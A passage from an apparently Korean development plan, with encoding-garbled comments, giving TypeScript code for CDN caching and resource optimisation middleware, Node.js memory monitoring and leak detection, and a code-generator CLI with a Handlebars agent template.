  // íŒŒì¼ íƒ€ì…ë³„ ìºì‹œ ì •ì±…
  private cacheRules: Record<string, string> = {
    // ë¶ˆë³€ ë¦¬ì†ŒìŠ¤ (í•´ì‹œê°€ ìˆëŠ” íŒŒì¼)
    'js.hash': 'public, max-age=31536000, immutable',
    'css.hash': 'public, max-age=31536000, immutable',
    'jpg': 'public, max-age=86400, stale-while-revalidate=604800',
    'png': 'public, max-age=86400, stale-while-revalidate=604800',
    'webp': 'public, max-age=86400, stale-while-revalidate=604800',
    'svg': 'public, max-age=86400, stale-while-revalidate=604800',
    'woff2': 'public, max-age=31536000, immutable',
    'json': 'no-cache, must-revalidate',
    'html': 'no-cache, no-store, must-revalidate'
  };
  
  // ìºì‹œ í—¤ë” ìƒì„±
  getCacheHeaders(filename: string): Record<string, string> {
    const ext = path.extname(filename).slice(1);
    const hasHash = /\.[a-f0-9]{8,}\./i.test(filename);
    
    const cacheKey = hasHash ? `${ext}.hash` : ext;
    const cacheControl = this.cacheRules[cacheKey] || 'public, max-age=3600';
    
    return {
      'Cache-Control': cacheControl,
      'Vary': 'Accept-Encoding',
      'X-Content-Type-Options': 'nosniff'
    };
  }
  
  // ì¡°ê±´ë¶€ ìš”ì²­ ì²˜ë¦¬
  handleConditionalRequest(
    req: Request,
    res: Response,
    fileStats: fs.Stats,
    etag: string
  ): boolean {
    // ETag í™•ì¸
    if (req.headers['if-none-match'] === etag) {
      res.status(304).end();
      return true;
    }
    
    // Last-Modified í™•ì¸
    const lastModified = fileStats.mtime.toUTCString();
    if (req.headers['if-modified-since'] === lastModified) {
      res.status(304).end();
      return true;
    }
    
    // í—¤ë” ì„¤ì •
    res.setHeader('ETag', etag);
    res.setHeader('Last-Modified', lastModified);
    
    return false;
  }
  
  // íŒŒì¼ ETag ìƒì„±
  generateETag(content: Buffer | string): string {
    const hash = crypto
      .createHash('md5')
      .update(content)
      .digest('hex');
    return `"${hash}"`;
  }
}

// ë¦¬ì†ŒìŠ¤ ìµœì í™” ë¯¸ë“¤ì›¨ì–´
export function resourceOptimizationMiddleware(options: {
  imageOptimizer: ImageOptimizationService;
  compressionService: CompressionService;
  cdnOptimizer: CDNOptimizer;
}) {
  const { imageOptimizer, compressionService, cdnOptimizer } = options;
  
  return async (req: Request, res: Response, next: NextFunction) => {
    // ì •ì  ë¦¬ì†ŒìŠ¤ ìš”ì²­ì´ ì•„ë‹ˆë©´ í†µê³¼
    if (!req.path.match(/\.(jpg|jpeg|png|webp|svg|js|css|woff2)$/i)) {
      return next();
    }
    
    const filePath = path.join(process.cwd(), 'public', req.path);
    
    try {
      const stats = await fs.stat(filePath);
      
      // ì¡°ê±´ë¶€ ìš”ì²­ ì²˜ë¦¬
      const content = await fs.readFile(filePath);
      const etag = cdnOptimizer.generateETag(content);
      
      if (cdnOptimizer.handleConditionalRequest(req, res, stats, etag)) {
        return;
      }
      
      // ìºì‹œ í—¤ë” ì„¤ì •
      const cacheHeaders = cdnOptimizer.getCacheHeaders(req.path);
      Object.entries(cacheHeaders).forEach(([key, value]) => {
        res.setHeader(key, value);
      });
      
      // ì´ë¯¸ì§€ ìµœì í™”
      if (req.path.match(/\.(jpg|jpeg|png|webp)$/i)) {
        const acceptHeader = req.headers.accept || '';
        const supportsWebP = acceptHeader.includes('image/webp');
        const supportsAvif = acceptHeader.includes('image/avif');
        
        // ìµœì  í¬ë§· ì„ íƒ
        let format = 'original';
        if (supportsAvif) format = 'avif';
        else if (supportsWebP) format = 'webp';
        
        if (format !== 'original') {
          const cacheKey = imageOptimizer.generateCacheKey({
            path: req.path,
            format,
            width: req.query.w,
            quality: req.query.q
          });
          
          // ìºì‹œ í™•ì¸ ë° ìµœì í™”
          // ... êµ¬í˜„
        }
      }
      
      // ì••ì¶•
      const acceptEncoding = req.headers['accept-encoding'] || '';
      const compressedPath = await compressionService.compressFile(
        filePath,
        path.dirname(filePath),
        acceptEncoding
      );
      
      // ì••ì¶•ëœ íŒŒì¼ ì „ì†¡
      if (compressedPath !== filePath) {
        const encoding = compressedPath.endsWith('.br') ? 'br' : 'gzip';
        res.setHeader('Content-Encoding', encoding);
      }
      
      res.sendFile(compressedPath);
      
    } catch (error) {
      next(error);
    }
  };
}

// ë¦¬ì†ŒìŠ¤ íŒíŠ¸ ìƒì„±ê¸°
export class ResourceHintGenerator {
  // ë¦¬ì†ŒìŠ¤ íŒíŠ¸ ìƒì„±
  generateHints(resources: Array<{ url: string; type: string; priority?: string }>): string[] {
    const hints: string[] = [];
    
    resources.forEach(resource => {
      // Preconnect (ì™¸ë¶€ ë„ë©”ì¸)
      if (resource.url.startsWith('http')) {
        const origin = new URL(resource.url).origin;
        hints.push(`<link rel="preconnect" href="${origin}">`);
        hints.push(`<link rel="dns-prefetch" href="${origin}">`);
      }
      
      // Preload (ì¤‘ìš” ë¦¬ì†ŒìŠ¤)
      if (resource.priority === 'high') {
        const as = this.getResourceType(resource.type);
        hints.push(`<link rel="preload" href="${resource.url}" as="${as}">`);
      }
      
      // Prefetch (ë‹¤ìŒì— í•„ìš”í•œ ë¦¬ì†ŒìŠ¤)
      if (resource.priority === 'low') {
        hints.push(`<link rel="prefetch" href="${resource.url}">`);
      }
    });
    
    // ì¤‘ë³µ ì œê±°
    return [...new Set(hints)];
  }
  
  private getResourceType(mimeType: string): string {
    if (mimeType.includes('javascript')) return 'script';
    if (mimeType.includes('css')) return 'style';
    if (mimeType.includes('image')) return 'image';
    if (mimeType.includes('font')) return 'font';
    return 'fetch';
  }
  
  // Critical CSS ì¶”ì¶œ
  async extractCriticalCSS(html: string, css: string): Promise<string> {
    // ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” puppeteerë‚˜ penthouse ì‚¬ìš©
    // ì—¬ê¸°ì„œëŠ” ê°„ë‹¨í•œ ì˜ˆì‹œ
    const criticalSelectors = [
      'body', 'header', 'nav', 'main',
      '.hero', '.container', '.btn-primary'
    ];
    
    // CSS íŒŒì‹± ë° í•„í„°ë§
    // ... êµ¬í˜„
    
    return css; // ì„ì‹œ
  }
}
```

---

### SubTask 0.11.6: ë©”ëª¨ë¦¬ ê´€ë¦¬ ìµœì í™”
**ëª©í‘œ**: Node.js ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë©”ëª¨ë¦¬ ì‚¬ìš© ìµœì í™”

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/performance/memory-manager.ts
import v8 from 'v8';
import { performance } from 'perf_hooks';
import { EventEmitter } from 'events';
import { logger } from '../config/logger';

// ë©”ëª¨ë¦¬ ì„ê³„ê°’ ì„¤ì • (MB)
const MEMORY_THRESHOLDS = {
  WARNING: 1024,    // 1GB
  CRITICAL: 1536,   // 1.5GB
  MAX: 2048        // 2GB
};

export class MemoryManager extends EventEmitter {
  private monitoringInterval: NodeJS.Timer | null = null;
  private gcForceThreshold = 0.85; // í™ ì‚¬ìš©ë¥  85%ì—ì„œ GC ê°•ì œ ì‹¤í–‰
  private memoryLeakDetector: MemoryLeakDetector;
  
  constructor() {
    super();
    this.memoryLeakDetector = new MemoryLeakDetector();
    this.setupGCEvents();
  }
  
  // ë©”ëª¨ë¦¬ ëª¨ë‹ˆí„°ë§ ì‹œì‘
  startMonitoring(intervalMs: number = 30000): void {
    if (this.monitoringInterval) {
      return;
    }
    
    this.monitoringInterval = setInterval(() => {
      this.checkMemoryUsage();
    }, intervalMs);
    
    logger.info('Memory monitoring started');
  }
  
  // ë©”ëª¨ë¦¬ ëª¨ë‹ˆí„°ë§ ì¤‘ì§€
  stopMonitoring(): void {
    if (this.monitoringInterval) {
      clearInterval(this.monitoringInterval);
      this.monitoringInterval = null;
      logger.info('Memory monitoring stopped');
    }
  }
  
  // í˜„ì¬ ë©”ëª¨ë¦¬ ìƒíƒœ ì¡°íšŒ
  getMemoryStatus(): MemoryStatus {
    const memUsage = process.memoryUsage();
    const heapStats = v8.getHeapStatistics();
    
    const heapUsedMB = memUsage.heapUsed / 1024 / 1024;
    const heapTotalMB = memUsage.heapTotal / 1024 / 1024;
    const rssMB = memUsage.rss / 1024 / 1024;
    const externalMB = memUsage.external / 1024 / 1024;
    
    const heapUsagePercent = (heapStats.used_heap_size / heapStats.heap_size_limit) * 100;
    
    return {
      rss: rssMB,
      heapUsed: heapUsedMB,
      heapTotal: heapTotalMB,
      external: externalMB,
      heapUsagePercent,
      heapSizeLimit: heapStats.heap_size_limit / 1024 / 1024,
      totalPhysicalSize: heapStats.total_physical_size / 1024 / 1024,
      totalAvailableSize: heapStats.total_available_size / 1024 / 1024,
      usedHeapSize: heapStats.used_heap_size / 1024 / 1024,
      heapSpaces: this.getHeapSpaceInfo()
    };
  }
  
  // í™ ê³µê°„ë³„ ì •ë³´
  private getHeapSpaceInfo(): HeapSpaceInfo[] {
    const spaces = v8.getHeapSpaceStatistics();
    return spaces.map(space => ({
      spaceName: space.space_name,
      spaceSize: space.space_size / 1024 / 1024,
      spaceUsedSize: space.space_used_size / 1024 / 1024,
      spaceAvailableSize: space.space_available_size / 1024 / 1024,
      physicalSpaceSize: space.physical_space_size / 1024 / 1024
    }));
  }
  
  // ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ í™•ì¸
  private checkMemoryUsage(): void {
    const status = this.getMemoryStatus();
    
    // ì„ê³„ê°’ í™•ì¸
    if (status.heapUsed > MEMORY_THRESHOLDS.CRITICAL) {
      this.emit('memory:critical', status);
      this.handleCriticalMemory(status);
    } else if (status.heapUsed > MEMORY_THRESHOLDS.WARNING) {
      this.emit('memory:warning', status);
    }
    
    // í™ ì‚¬ìš©ë¥  í™•ì¸
    if (status.heapUsagePercent > this.gcForceThreshold * 100) {
      this.forceGarbageCollection();
    }
    
    // ë©”ëª¨ë¦¬ ëˆ„ìˆ˜ ê°ì§€
    this.memoryLeakDetector.addSample(status);
    
    // ë©”íŠ¸ë¦­ ê¸°ë¡
    this.recordMemoryMetrics(status);
  }
  
  // ìœ„í—˜ ë©”ëª¨ë¦¬ ìƒíƒœ ì²˜ë¦¬
  private handleCriticalMemory(status: MemoryStatus): void {
    logger.error('Critical memory usage detected', status);
    
    // 1. ê°•ì œ ê°€ë¹„ì§€ ì»¬ë ‰ì…˜
    this.forceGarbageCollection();
    
    // 2. ìºì‹œ ì •ë¦¬
    this.emit('memory:cleanup:cache');
    
    // 3. ëŒ€ìš©ëŸ‰ ê°ì²´ í•´ì œ
    this.emit('memory:cleanup:objects');
    
    // 4. ì—¬ì „íˆ ë†’ìœ¼ë©´ ì¼ë¶€ ê¸°ëŠ¥ ì œí•œ
    if (status.heapUsed > MEMORY_THRESHOLDS.MAX) {
      this.emit('memory:limit:features');
    }
  }
  
  // ê°•ì œ ê°€ë¹„ì§€ ì»¬ë ‰ì…˜
  private forceGarbageCollection(): void {
    if (global.gc) {
      const before = process.memoryUsage().heapUsed;
      global.gc();
      const after = process.memoryUsage().heapUsed;
      const freed = (before - after) / 1024 / 1024;
      
      logger.info(`Forced GC: freed ${freed.toFixed(2)} MB`);
    }
  }
  
  // GC ì´ë²¤íŠ¸ ì„¤ì •
  private setupGCEvents(): void {
    if (!performance.nodeTiming) return;
    
    const obs = new PerformanceObserver((list) => {
      const entries = list.getEntries();
      entries.forEach((entry) => {
        if (entry.entryType === 'gc') {
          this.handleGCEvent(entry as any);
        }
      });
    });
    
    obs.observe({ entryTypes: ['gc'] });
  }
  
  // GC ì´ë²¤íŠ¸ ì²˜ë¦¬
  private handleGCEvent(gcEntry: any): void {
    const gcInfo = {
      type: gcEntry.detail.kind,
      duration: gcEntry.duration,
      timestamp: gcEntry.startTime
    };
    
    this.emit('gc', gcInfo);
    
    // ê¸´ GC ê²½ê³ 
    if (gcEntry.duration > 100) {
      logger.warn('Long GC detected', gcInfo);
    }
  }
  
  // ë©”ëª¨ë¦¬ ë©”íŠ¸ë¦­ ê¸°ë¡
  private recordMemoryMetrics(status: MemoryStatus): void {
    // Prometheus ë©”íŠ¸ë¦­ ì—…ë°ì´íŠ¸
    const { MetricsHelper } = require('../config/metrics');
    MetricsHelper.recordMemoryUsage(status);
  }
  
  // í™ ìŠ¤ëƒ…ìƒ· ìƒì„±
  async createHeapSnapshot(filename?: string): Promise<string> {
    const snapshotPath = filename || `heapdump-${Date.now()}.heapsnapshot`;
    
    return new Promise((resolve, reject) => {
      const stream = v8.writeHeapSnapshot(snapshotPath);
      stream.on('finish', () => {
        logger.info(`Heap snapshot created: ${snapshotPath}`);
        resolve(snapshotPath);
      });
      stream.on('error', reject);
    });
  }
  
  // ë©”ëª¨ë¦¬ í”„ë¡œíŒŒì¼ë§
  async profileMemory(durationMs: number = 60000): Promise<MemoryProfile> {
    const startUsage = process.memoryUsage();
    const samples: MemoryStatus[] = [];
    const interval = 1000; // 1ì´ˆë§ˆë‹¤ ìƒ˜í”Œë§
    
    const samplingInterval = setInterval(() => {
      samples.push(this.getMemoryStatus());
    }, interval);
    
    await new Promise(resolve => setTimeout(resolve, durationMs));
    clearInterval(samplingInterval);
    
    const endUsage = process.memoryUsage();
    
    return {
      duration: durationMs,
      samples,
      startUsage,
      endUsage,
      summary: this.analyzeMemoryProfile(samples)
    };
  }
  
  // ë©”ëª¨ë¦¬ í”„ë¡œíŒŒì¼ ë¶„ì„
  private analyzeMemoryProfile(samples: MemoryStatus[]): MemoryProfileSummary {
    const heapUsedValues = samples.map(s => s.heapUsed);
    
    return {
      avgHeapUsed: heapUsedValues.reduce((a, b) => a + b, 0) / heapUsedValues.length,
      maxHeapUsed: Math.max(...heapUsedValues),
      minHeapUsed: Math.min(...heapUsedValues),
      trend: this.calculateMemoryTrend(heapUsedValues),
      volatility: this.calculateVolatility(heapUsedValues)
    };
  }
  
  // ë©”ëª¨ë¦¬ ì¶”ì„¸ ê³„ì‚°
  private calculateMemoryTrend(values: number[]): 'increasing' | 'stable' | 'decreasing' {
    if (values.length < 2) return 'stable';
    
    const firstHalf = values.slice(0, Math.floor(values.length / 2));
    const secondHalf = values.slice(Math.floor(values.length / 2));
    
    const firstAvg = firstHalf.reduce((a, b) => a + b, 0) / firstHalf.length;
    const secondAvg = secondHalf.reduce((a, b) => a + b, 0) / secondHalf.length;
    
    const change = ((secondAvg - firstAvg) / firstAvg) * 100;
    
    if (change > 10) return 'increasing';
    if (change < -10) return 'decreasing';
    return 'stable';
  }
  
  // ë³€ë™ì„± ê³„ì‚°
  private calculateVolatility(values: number[]): number {
    const mean = values.reduce((a, b) => a + b, 0) / values.length;
    const variance = values.reduce((sum, val) => sum + Math.pow(val - mean, 2), 0) / values.length;
    return Math.sqrt(variance);
  }
}

// ë©”ëª¨ë¦¬ ëˆ„ìˆ˜ ê°ì§€ê¸°
class MemoryLeakDetector {
  private samples: MemoryStatus[] = [];
  private readonly maxSamples = 60; // 30ë¶„ê°„ ë°ì´í„° (30ì´ˆ ê°„ê²©)
  private readonly leakThreshold = 0.1; // 10% ì¦ê°€ìœ¨
  
  addSample(status: MemoryStatus): void {
    this.samples.push(status);
    
    if (this.samples.length > this.maxSamples) {
      this.samples.shift();
    }
    
    if (this.samples.length >= 10) {
      this.detectLeak();
    }
  }
  
  private detectLeak(): void {
    const recentSamples = this.samples.slice(-10);
    const trend = this.calculateTrend(recentSamples);
    
    if (trend.slope > this.leakThreshold && trend.r2 > 0.8) {
      logger.warn('Potential memory leak detected', {
        slope: trend.slope,
        r2: trend.r2,
        currentHeap: recentSamples[recentSamples.length - 1].heapUsed
      });
    }
  }
  
  // ì„ í˜• íšŒê·€ ë¶„ì„
  private calculateTrend(samples: MemoryStatus[]): { slope: number; r2: number } {
    const n = samples.length;
    const x = samples.map((_, i) => i);
    const y = samples.map(s => s.heapUsed);
    
    const sumX = x.reduce((a, b) => a + b, 0);
    const sumY = y.reduce((a, b) => a + b, 0);
    const sumXY = x.reduce((sum, xi, i) => sum + xi * y[i], 0);
    const sumX2 = x.reduce((sum, xi) => sum + xi * xi, 0);
    
    const slope = (n * sumXY - sumX * sumY) / (n * sumX2 - sumX * sumX);
    const intercept = (sumY - slope * sumX) / n;
    
    // RÂ² ê³„ì‚°
    const yMean = sumY / n;
    const ssTotal = y.reduce((sum, yi) => sum + Math.pow(yi - yMean, 2), 0);
    const ssResidual = y.reduce((sum, yi, i) => {
      const prediction = slope * x[i] + intercept;
      return sum + Math.pow(yi - prediction, 2);
    }, 0);
    
    const r2 = 1 - (ssResidual / ssTotal);
    
    return { slope: slope / yMean, r2 }; // ì •ê·œí™”ëœ ê¸°ìš¸ê¸°
  }
}

// ë©”ëª¨ë¦¬ í’€ ê´€ë¦¬ì
export class MemoryPoolManager<T> {
  private pool: T[] = [];
  private inUse: Set<T> = new Set();
  private factory: () => T;
  private reset: (obj: T) => void;
  private maxSize: number;
  
  constructor(options: {
    factory: () => T;
    reset: (obj: T) => void;
    initialSize?: number;
    maxSize?: number;
  }) {
    this.factory = options.factory;
    this.reset = options.reset;
    this.maxSize = options.maxSize || 100;
    
    // ì´ˆê¸° í’€ ìƒì„±
    const initialSize = options.initialSize || 10;
    for (let i = 0; i < initialSize; i++) {
      this.pool.push(this.factory());
    }
  }
  
  // ê°ì²´ íšë“
  acquire(): T {
    let obj = this.pool.pop();
    
    if (!obj) {
      obj = this.factory();
    }
    
    this.inUse.add(obj);
    return obj;
  }
  
  // ê°ì²´ ë°˜í™˜
  release(obj: T): void {
    if (!this.inUse.has(obj)) {
      return;
    }
    
    this.inUse.delete(obj);
    this.reset(obj);
    
    if (this.pool.length < this.maxSize) {
      this.pool.push(obj);
    }
  }
  
  // í’€ ìƒíƒœ
  getStats(): { poolSize: number; inUse: number } {
    return {
      poolSize: this.pool.length,
      inUse: this.inUse.size
    };
  }
  
  // í’€ ì •ë¦¬
  clear(): void {
    this.pool = [];
    this.inUse.clear();
  }
}

// WeakMap ê¸°ë°˜ ìºì‹œ
export class WeakCache<K extends object, V> {
  private cache = new WeakMap<K, { value: V; timestamp: number }>();
  private ttl: number;
  
  constructor(ttlMs: number = 60000) {
    this.ttl = ttlMs;
  }
  
  set(key: K, value: V): void {
    this.cache.set(key, {
      value,
      timestamp: Date.now()
    });
  }
  
  get(key: K): V | undefined {
    const entry = this.cache.get(key);
    
    if (!entry) {
      return undefined;
    }
    
    if (Date.now() - entry.timestamp > this.ttl) {
      this.cache.delete(key);
      return undefined;
    }
    
    return entry.value;
  }
  
  has(key: K): boolean {
    return this.get(key) !== undefined;
  }
  
  delete(key: K): boolean {
    return this.cache.delete(key);
  }
}

// íƒ€ì… ì •ì˜
interface MemoryStatus {
  rss: number;
  heapUsed: number;
  heapTotal: number;
  external: number;
  heapUsagePercent: number;
  heapSizeLimit: number;
  totalPhysicalSize: number;
  totalAvailableSize: number;
  usedHeapSize: number;
  heapSpaces: HeapSpaceInfo[];
}

interface HeapSpaceInfo {
  spaceName: string;
  spaceSize: number;
  spaceUsedSize: number;
  spaceAvailableSize: number;
  physicalSpaceSize: number;
}

interface MemoryProfile {
  duration: number;
  samples: MemoryStatus[];
  startUsage: NodeJS.MemoryUsage;
  endUsage: NodeJS.MemoryUsage;
  summary: MemoryProfileSummary;
}

interface MemoryProfileSummary {
  avgHeapUsed: number;
  maxHeapUsed: number;
  minHeapUsed: number;
  trend: 'increasing' | 'stable' | 'decreasing';
  volatility: number;
}
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- Node.js ì‹¤í–‰ ì‹œ `--expose-gc` í”Œë˜ê·¸ ì¶”ê°€
- ë©”ëª¨ë¦¬ ì„ê³„ê°’ì„ í™˜ê²½ì— ë§ê²Œ ì¡°ì •
- ë©”ëª¨ë¦¬ ëˆ„ìˆ˜ ê°ì§€ ì‹œ ì•Œë¦¼ ì„¤ì •
- ì •ê¸°ì ì¸ í™ ìŠ¤ëƒ…ìƒ· ìƒì„± ìŠ¤ì¼€ì¤„ ì„¤ì •

---

## Task 0.12: ê°œë°œ ì›Œí¬í”Œë¡œìš° ìµœì í™”

### SubTask 0.12.1: ìë™í™”ëœ ì½”ë“œ ìƒì„± ë„êµ¬
**ëª©í‘œ**: ë°˜ë³µì ì¸ ì½”ë“œ ì‘ì„±ì„ ìœ„í•œ ìë™í™” ë„êµ¬ êµ¬ì¶•

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// scripts/code-generator/generator.ts
import { Command } from 'commander';
import inquirer from 'inquirer';
import { promises as fs } from 'fs';
import path from 'path';
import Handlebars from 'handlebars';
import chalk from 'chalk';

// í…œí”Œë¦¿ ë§¤ë‹ˆì €
class TemplateManager {
  private templatesDir = path.join(__dirname, 'templates');
  private templates: Map<string, HandlebarsTemplateDelegate> = new Map();
  
  async loadTemplates(): Promise<void> {
    const templateFiles = await fs.readdir(this.templatesDir);
    
    for (const file of templateFiles) {
      if (file.endsWith('.hbs')) {
        const name = path.basename(file, '.hbs');
        const content = await fs.readFile(
          path.join(this.templatesDir, file),
          'utf-8'
        );
        this.templates.set(name, Handlebars.compile(content));
      }
    }
    
    this.registerHelpers();
  }
  
  private registerHelpers(): void {
    // ì¼€ì´ìŠ¤ ë³€í™˜ í—¬í¼
    Handlebars.registerHelper('camelCase', (str: string) => 
      str.replace(/-./g, x => x[1].toUpperCase())
    );
    
    Handlebars.registerHelper('pascalCase', (str: string) => {
      const camel = str.replace(/-./g, x => x[1].toUpperCase());
      return camel.charAt(0).toUpperCase() + camel.slice(1);
    });
    
    Handlebars.registerHelper('kebabCase', (str: string) =>
      str.replace(/[A-Z]/g, letter => `-${letter.toLowerCase()}`).replace(/^-/, '')
    );
    
    // ì¡°ê±´ë¶€ í—¬í¼
    Handlebars.registerHelper('if_eq', function(a, b, options) {
      if (a === b) {
        return options.fn(this);
      }
      return options.inverse(this);
    });
  }
  
  render(templateName: string, data: any): string {
    const template = this.templates.get(templateName);
    if (!template) {
      throw new Error(`Template '${templateName}' not found`);
    }
    return template(data);
  }
}

// ì½”ë“œ ìƒì„±ê¸°
class CodeGenerator {
  private templateManager = new TemplateManager();
  
  async initialize(): Promise<void> {
    await this.templateManager.loadTemplates();
  }
  
  // ì—ì´ì „íŠ¸ ìƒì„±
  async generateAgent(name: string): Promise<void> {
    const answers = await inquirer.prompt([
      {
        type: 'list',
        name: 'type',
        message: 'Select agent type:',
        choices: [
          'processing',
          'analysis',
          'generation',
          'integration'
        ]
      },
      {
        type: 'checkbox',
        name: 'capabilities',
        message: 'Select agent capabilities:',
        choices: [
          'database-access',
          'file-operations',
          'api-calls',
          'llm-integration',
          'caching'
        ]
      },
      {
        type: 'input',
        name: 'description',
        message: 'Agent description:'
      }
    ]);
    
    const data = {
      name,
      className: this.toPascalCase(name),
      ...answers
    };
    
    // ì—ì´ì „íŠ¸ íŒŒì¼ ìƒì„±
    const agentCode = this.templateManager.render('agent', data);
    const agentPath = path.join(
      process.cwd(),
      'backend/src/agents',
      `${name}-agent.ts`
    );
    
    await fs.writeFile(agentPath, agentCode);
    
    // í…ŒìŠ¤íŠ¸ íŒŒì¼ ìƒì„±
    const testCode = this.templateManager.render('agent-test', data);
    const testPath = path.join(
      process.cwd(),
      'backend/tests/agents',
      `${name}-agent.test.ts`
    );
    
    await fs.writeFile(testPath, testCode);
    
    // ë¬¸ì„œ ìƒì„±
    const docCode = this.templateManager.render('agent-doc', data);
    const docPath = path.join(
      process.cwd(),
      'docs/agents',
      `${name}-agent.md`
    );
    
    await fs.writeFile(docPath, docCode);
    
    console.log(chalk.green(`âœ… Agent '${name}' generated successfully!`));
    console.log(chalk.blue('Generated files:'));
    console.log(`  - ${agentPath}`);
    console.log(`  - ${testPath}`);
    console.log(`  - ${docPath}`);
  }
  
  // API ì—”ë“œí¬ì¸íŠ¸ ìƒì„±
  async generateEndpoint(resource: string): Promise<void> {
    const answers = await inquirer.prompt([
      {
        type: 'checkbox',
        name: 'methods',
        message: 'Select HTTP methods:',
        choices: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
        default: ['GET', 'POST', 'PUT', 'DELETE']
      },
      {
        type: 'confirm',
        name: 'authentication',
        message: 'Require authentication?',
        default: true
      },
      {
        type: 'confirm',
        name: 'validation',
        message: 'Include validation?',
        default: true
      },
      {
        type: 'confirm',
        name: 'pagination',
        message: 'Include pagination?',
        default: true
      }
    ]);
    
    const data = {
      resource,
      resourceName: this.toPascalCase(resource),
      ...answers
    };
    
    // ì»¨íŠ¸ë¡¤ëŸ¬ ìƒì„±
    const controllerCode = this.templateManager.render('controller', data);
    const controllerPath = path.join(
      process.cwd(),
      'backend/src/controllers',
      `${resource}.controller.ts`
    );
    
    await fs.writeFile(controllerPath, controllerCode);
    
    // ì„œë¹„ìŠ¤ ìƒì„±
    const serviceCode = this.templateManager.render('service', data);
    const servicePath = path.join(
      process.cwd(),
      'backend/src/services',
      `${resource}.service.ts`
    );
    
    await fs.writeFile(servicePath, serviceCode);
    
    // ë¼ìš°íŠ¸ ìƒì„±
    const routeCode = this.templateManager.render('route', data);
    const routePath = path.join(
      process.cwd(),
      'backend/src/routes',
      `${resource}.routes.ts`
    );
    
    await fs.writeFile(routePath, routeCode);
    
    // ê²€ì¦ ìŠ¤í‚¤ë§ˆ ìƒì„±
    if (answers.validation) {
      const validationCode = this.templateManager.render('validation', data);
      const validationPath = path.join(
        process.cwd(),
        'backend/src/validations',
        `${resource}.validation.ts`
      );
      
      await fs.writeFile(validationPath, validationCode);
    }
    
    console.log(chalk.green(`âœ… API endpoint '${resource}' generated successfully!`));
  }
  
  // React ì»´í¬ë„ŒíŠ¸ ìƒì„±
  async generateComponent(name: string): Promise<void> {
    const answers = await inquirer.prompt([
      {
        type: 'list',
        name: 'type',
        message: 'Component type:',
        choices: ['functional', 'class']
      },
      {
        type: 'confirm',
        name: 'typescript',
        message: 'Use TypeScript?',
        default: true
      },
      {
        type: 'confirm',
        name: 'styles',
        message: 'Include styles?',
        default: true
      },
      {
        type: 'confirm',
        name: 'tests',
        message: 'Include tests?',
        default: true
      },
      {
        type: 'checkbox',
        name: 'hooks',
        message: 'Select hooks to use:',
        choices: ['useState', 'useEffect', 'useContext', 'useReducer', 'useMemo', 'useCallback']
      }
    ]);
    
    const data = {
      name,
      componentName: this.toPascalCase(name),
      ...answers
    };
    
    const ext = answers.typescript ? 'tsx' : 'jsx';
    const styleExt = 'module.css';
    
    // ì»´í¬ë„ŒíŠ¸ ë””ë ‰í† ë¦¬ ìƒì„±
    const componentDir = path.join(
      process.cwd(),
      'frontend/src/components',
      name
    );
    await fs.mkdir(componentDir, { recursive: true });
    
    // ì»´í¬ë„ŒíŠ¸ íŒŒì¼ ìƒì„±
    const componentCode = this.templateManager.render('react-component', data);
    const componentPath = path.join(componentDir, `index.${ext}`);
    await fs.writeFile(componentPath, componentCode);
    
    // ìŠ¤íƒ€ì¼ íŒŒì¼ ìƒì„±
    if (answers.styles) {
      const styleCode = this.templateManager.render('component-styles', data);
      const stylePath = path.join(componentDir, `styles.${styleExt}`);
      await fs.writeFile(stylePath, styleCode);
    }
    
    // í…ŒìŠ¤íŠ¸ íŒŒì¼ ìƒì„±
    if (answers.tests) {
      const testCode = this.templateManager.render('component-test', data);
      const testPath = path.join(componentDir, `${name}.test.${ext}`);
      await fs.writeFile(testPath, testCode);
    }
    
    // ìŠ¤í† ë¦¬ë¶ íŒŒì¼ ìƒì„±
    const storyCode = this.templateManager.render('component-story', data);
    const storyPath = path.join(componentDir, `${name}.stories.${ext}`);
    await fs.writeFile(storyPath, storyCode);
    
    console.log(chalk.green(`âœ… Component '${name}' generated successfully!`));
  }
  
  // ìœ í‹¸ë¦¬í‹° ë©”ì„œë“œ
  private toPascalCase(str: string): string {
    return str
      .split(/[-_]/)
      .map(word => word.charAt(0).toUpperCase() + word.slice(1))
      .join('');
  }
}

// CLI ì„¤ì •
const program = new Command();
const generator = new CodeGenerator();

program
  .name('t-dev-gen')
  .description('T-Developer code generator')
  .version('1.0.0');

program
  .command('agent <name>')
  .description('Generate a new agent')
  .action(async (name) => {
    await generator.initialize();
    await generator.generateAgent(name);
  });

program
  .command('api <resource>')
  .description('Generate API endpoint')
  .action(async (resource) => {
    await generator.initialize();
    await generator.generateEndpoint(resource);
  });

program
  .command('component <name>')
  .description('Generate React component')
  .action(async (name) => {
    await generator.initialize();
    await generator.generateComponent(name);
  });

program.parse();
```

```handlebars
<!-- scripts/code-generator/templates/agent.hbs -->
import { Agent } from '@/core/agent';
import { logger } from '@/config/logger';
{{#if (includes capabilities 'database-access')}}
import { DynamoDBDocumentClient } from '@aws-sdk/lib-dynamodb';
{{/if}}
{{#if (includes capabilities 'llm-integration')}}
import { BedrockClient } from '@aws-sdk/client-bedrock';
{{/if}}

/**
 * {{description}}
 */
export class {{className}}Agent extends Agent {
  static readonly AGENT_NAME = '{{name}}';
  static readonly AGENT_TYPE = '{{type}}';
  
  {{#if (includes capabilities 'database-access')}}
  private docClient: DynamoDBDocumentClient;
  {{/if}}
  {{#if (includes capabilities 'llm-integration')}}
  private bedrockClient: BedrockClient;
  {{/if}}
  
  constructor() {
    super({
      name: {{className}}Agent.AGENT_NAME,
      type: {{className}}Agent.AGENT_TYPE,
      capabilities: [
        {{#each capabilities}}
        '{{this}}',
        {{/each}}
      ]
    });
    
    this.initialize();
  }
  
  private initialize(): void {
    {{#if (includes capabilities 'database-access')}}
    this.docClient = this.createDynamoDBClient();
    {{/if}}
    {{#if (includes capabilities 'llm-integration')}}
    this.bedrockClient = this.createBedrockClient();
    {{/if}}
  }
  
  async execute(input: any): Promise<any> {
    logger.info(`Executing ${this.name} agent`, { input });
    
    try {
      // Validate input
      this.validateInput(input);
      
      // Process input
      const result = await this.process(input);
      
      // Return result
      return {
        success: true,
        data: result,
        metadata: {
          agentName: this.name,
          executionTime: Date.now(),
          version: '1.0.0'
        }
      };
      
    } catch (error) {
      logger.error(`Error in ${this.name} agent`, error);
